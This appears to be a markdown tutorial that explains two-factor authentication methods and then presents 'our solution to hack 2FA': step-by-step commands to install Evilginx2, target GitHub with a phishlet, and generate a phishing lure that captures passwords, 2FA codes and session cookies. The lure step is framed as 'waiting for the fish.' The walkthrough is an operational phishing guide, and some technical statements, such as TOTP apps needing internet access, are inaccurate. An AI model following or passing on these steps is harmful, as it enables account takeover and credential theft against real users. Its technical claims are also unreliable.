#Two Factor Authentication
##What is the 2FA?
2FA is an electronic authentication method in which a user is granted access to a website or application only after successfully presenting two or more pieces of factors to an authentication mechanism: knowledge (something only the user knows), possession (something only the user has), and inherence (something only the user is). MFA protects user data—which may include personal identification or financial assets—from being accessed by an unauthorized third party that may have been able to discover, for example, a single password.

##Who uses it
- finance
- healthcare
- law enforcement 
- government

##How does it work? 
###Different forms of two-factor authentication
####Physical Authentication Keys(U2F)
- A common two-factor combination is a password + some personal item, such as a USB shield for online banking. The user plugs the USB shield into the laptop and enters the password to log in to online banking.
It is a minor USB key that you put on your keychain. Whenever you want to log into your account from a new computer, you have to insert the USB key and press the button on it. That is it - no code needed. In the future, these devices should work with NFC and Bluetooth to communicate with mobile devices that do not have USB ports.
- Pro:
This solution works better than SMS verification and one-time-use codes because it cannot be intercepted and messed.
- Con:
The user cannot carry the USB shield at all times, and it is easy to lose it. In contrast, mobile phones are an excellent alternative.

####SMS
- Many services require users to receive SMS messages when they login to their accounts. The SMS message will contain a one-time code, and the user needs to enter this code as a second authentication method to log in to the account.
- Pro:
Compared with U2F, it is more portable. Because users do not need to carry extra equipment, most people have cell phones. Some services even dial a phone number and have an automated system to speak the code, and landline numbers that cannot receive text messages can also receive codes.
- Con:
There is a big problem with SMS. Attackers can use SIM swapping attacks to access the security codes or intercept them.
####Authenticator Apps(TOTP)
- The full name of TOTP is Time-based One-time Password. It is recognized as a reliable solution and has been written into the international standard RFC6238.

- Authentication apps work by using a mobile app to generate an authentication code. Unlike SMS, the application does not require the user to access the wireless network. Any internet connection is sufficient to access the account. How it works is that when the user turns on two-factor authentication, the server will generate a secret key. The server prompts the user to scan the QR code (or use other methods) to save the key to the user's mobile phone. That is to say, the server and the user's mobile phone now have the same key. Note that the key must be bound to the phone. Once the user changes the phone, a brand new key must be generated. When the user is ready to log in, the mobile client uses this key and the current timestamp to generate a hash with a default validity period of 30 seconds. The user submits this hash to the server within the validity period. Finally, the server also uses the key and the current timestamp to generate a hash compared with the hash submitted by the user. As long as the two are inconsistent, the login is denied.
- Google Authenticator

##Types of 2FA hacking
- Supply Chain Attacks: Vendor attacks that target the supply chain of a software or software that is a service to the vendor. The goal is to access source codes. The most famous attack in recent years is the [SolarWinds](https://www.csoonline.com/article/3601508/solarwinds-supply-chain-attack-explained-why-organizations-were-not-prepared.html) attack, various code components of the company were infected, and employees of the company downloaded the virus software by accident. Hackers modify authentication credentials and use tools to modify environment variables, allowing hackers to track and modify target IP addresses to obtain sensitive information.

- Compromised MFA authentication: Control the account directly through other methods such as information verification, or directly modify the user verification OTP. This bug has been fixed.

##A Silver Buillet?
Imagining A stone in the middle of the road, you don't want to push it away or smash it, the most practical way is to go around it since our goal is to keep walking down the road. This thought guides us: Is there a way to bypass 2FA itself, not by modifying 2FA, but to directly control the account beyond 2FA, after all, that is our purpose.

##Our Solution to hack 2FA -- Man-In-The-Middle Attacks(MITM)
To put it simply, the hacker creates a phishing website by intercepting the user's traffic, where the user enters various information, the encrypted information is decoded on the hacker's server, and then the hacker extracts the user's cookie from the YAML file, and then Hacking accounts to conduct criminal activities.

Old tactics (phishing) involving two steps:
- Interception: intercepts user traffic through the attacker’s network before it reaches its intended destination. The common way to do this are: IP spoofing,ARP spoofing, DNS spoofing.
- Decryption: decrypted information got from phishing user without alerting the user or application.

Yet it is not an ideal way to dealing with 2FA. Most 2FA website verification will reopen a new window, which means that the single html template sent by the hacker cannot re-import the user into another window, so the hacker has no way of knowing what 2FA code is.

That's why we need a framework called Evilginx.

##What is Evilginx?
- A MITM framework setting up phishing pages
- It captures not only usernames and passwords, but also captures authentication tokens sent as cookies. 
- Captured authentication tokens allow the attacker to bypass any form of 2FA enabled on user's account.
- Even if phished user has 2FA enabled, the hacker would only need to set up a domain and a VPS server then he is able to remotely control the account. 
- The 2FA with SMS codes, mobile authenticator app or recovery keys are completely useless deal with this attack.

##How does Evilginx work?
- Instead of creating a lookalike sign-in page, it creates a layer between the phished user and the real website.
- While the user interacts with the real website, the evilginx would extract information from both side.
- Once the session cookie is obtained, Hackers are able to bypass any 2FA.

##Evilginx implementation

- Tools required:
1. A Ubuntu Server (above 20.0)
2. A DNS (you can buy on main domain name provider such as Google Domain)
3. GO language installed

####First step (If you had installed GO, please skip this step):

Get GO package
```bash
    wget -c https://golang.org/dl/go1.15.2.linux-amd64.tar.gz
```
Unzip it
```bash
    sudo tar -C /usr/local -xvzf go1.15.2.linux-amd64.tar.gz
```

Adding global variable to the system script. First open up the file editor with 
```bash
    vi ~/.bashrc
```
Then add this line to the end of the file
```bash 
    export  PATH=$PATH:/usr/local/go/bin
```

####Second step, installing Evilginx2
These commands will download evilginx from github website and MAKE the folder
```bash
    sudo apt-get -y install git make
    git clone https://github.com/kgretzky/evilginx2.git
    cd evilginx2
    make
```

####Third step, activate Evilginx2
```bash
    sudo ./bin/evilginx -p ./phishlets/
```

####Fourth step, configures the target website by setting the desired subdomain
In the Evilginx2 command-line tool, type in
```bash
    config ip the_IP_adress_of_the_current_machine
    config domain the_domain_adress_that_you_have
```
Specific which website we are going to launch an attack, in this case the Github
```bash
    phishlets hostname github the_domain_adress_that_you_have
```
You need to enable the target before attack
```bash
    phishlets enable github
```
####Fifth step, create a phishing website link
```bash
    lure create github
    lure get-url 0
```

####Sixth step, waiting for the fish.
The Evilginx will bring all information the user had inteacts with the website, including its username and password and its 2FA code. Not only it, as long as the user did not find out the DNS is wrong, we pretty much can monitor what has he done in this website.

##Summary:

- The advantage of two-factor authentication is that it is much more secure than a simple password login. Even if the password is leaked, the account is safe as long as the phone is still there. Various password cracking methods are invalid for two-factor authentication.

- The disadvantage is that it takes one more step to log in, which is time-consuming and troublesome, and the user will feel impatient. Moreover, it does not mean that the account is safe; an intruder can still hijack the entire session by stealing the cookie or token.

- One of the biggest problems with two-factor authentication is account recovery. Once a user forgets his password or loses his phone, he must bypass two-factor authentication to restore login, which creates a security hole. Unless preparing two sets of two-factor authentication, one is used for logging in, and the other is to restore the account.

##Reference:

https://www.merchantfraudjournal.com/two-factor-authentication-work/

https://duo.com/product/multi-factor-authentication-mfa/two-factor-authentication-2fa

https://www.howtogeek.com/232598/5-different-two-step-authentication-methods-to-secure-your-online-accounts/

https://www.secsign.com/usb-authentication-keys-tokens-bad-idea/

https://www.usenix.org/system/files/soups2019-reese.pdf

